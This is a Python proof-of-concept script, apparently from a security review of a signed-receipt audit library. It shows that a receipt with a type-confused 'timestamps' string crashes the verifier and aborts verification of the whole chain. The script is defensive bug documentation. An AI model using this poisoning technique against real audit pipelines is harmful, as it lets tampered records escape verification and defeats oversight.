#!/usr/bin/env python3
"""PoC 12 — S2.6/S2.10: TYPE-CONFUSED sub-objects crash the verifier outright.

verify_receipt does pred.get("timestamps", {}) then ts.get(...) with no
isinstance check. A validly-signed receipt whose "timestamps" is a string
makes verify_receipt raise AttributeError — it returns NO verdict at all
(not FAIL, not INCOMPLETE). Inside verify_chain, one such receipt aborts the
entire audit run at that index: denial of verification for the whole ledger.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, verify_chain,
                         build_receipt, canonical, sha256_hex, sign, keyid,
                         PREDICATE_TYPE)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

def sign_statement(sk, predicate):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": "prod:svc",
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, canonical(stmt))}]
    return stmt

sk, pk = generate_keypair()
good = build_receipt(action_id="a-001", subject_name="prod:svc", actor=HUMAN,
                     policy_decision=POL,
                     execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                     evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

evil_predicate = {
    "action_id": "a-002", "actor": HUMAN, "policy_decision": POL,
    "execution": {"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
    "evidence": {"items": EV, "completeness": "COMPLETE", "redaction_commitments": []},
    "timestamps": "ntp-synced-definitely",   # <-- type-confused: str, not dict
    "prev_chain_hash": "GENESIS",
}
evil = sign_statement(sk, evil_predicate)

crashed_single = crashed_chain = False
try:
    verify_receipt(evil, pk)
except Exception as e:
    crashed_single = True
    print("verify_receipt raised:", type(e).__name__, "-", str(e)[:70])
try:
    verify_chain([good, evil], pk)
except Exception as e:
    crashed_chain = True
    print("verify_chain raised:", type(e).__name__, "- aborts whole audit run")

# Unexpected: verifier crashes instead of returning FAIL/INCOMPLETE; one
# poisoned receipt denies verification of every receipt in the batch.
if crashed_single and crashed_chain:
    print("EXPLOIT-WORKS")
else:
    print("HELD")
